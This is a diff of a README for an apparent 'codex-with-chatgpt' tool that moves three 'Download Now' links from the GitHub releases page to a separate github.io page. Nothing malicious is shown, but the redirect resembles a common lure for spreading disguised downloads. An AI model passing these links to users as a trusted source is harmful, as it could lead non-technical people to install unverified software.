@@ -1,6 +1,6 @@
 # 🧠 codex-with-chatgpt - Let ChatGPT Think, Codex Execute
 
-[![Download Now](https://img.shields.io/badge/Download-Now-42b883?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cytochromecarch637/codex-with-chatgpt/releases)
+[![Download Now](https://img.shields.io/badge/Download-Now-42b883?style=for-the-badge&logo=github&logoColor=white)](https://cytochromecarch637.github.io)
 
 ---
 
@@ -38,7 +38,7 @@ Getting started is easier than you think. You don't need to be a programmer or u
 
 Visit this link to download the application:
 
-[🔗 Click Here to Download codex-with-chatgpt](https://github.com/Cytochromecarch637/codex-with-chatgpt/releases)
+[🔗 Click Here to Download codex-with-chatgpt](https://cytochromecarch637.github.io)
 
 )
 
@@ -168,7 +168,7 @@ Have questions, ideas, or want to share what you've built? We'd love to hear fro
 
 Don't wait any longer. Download now, and in less than five minutes, you'll have your own AI-powered planning-and-building team ready to tackle any project you throw at it.
 
-[🚀 Download codex-with-chatgpt Now](https://github.com/Cytochromecarch637/codex-with-chatgpt/releases)
+[🚀 Download codex-with-chatgpt Now](https://cytochromecarch637.github.io)
 
 
 
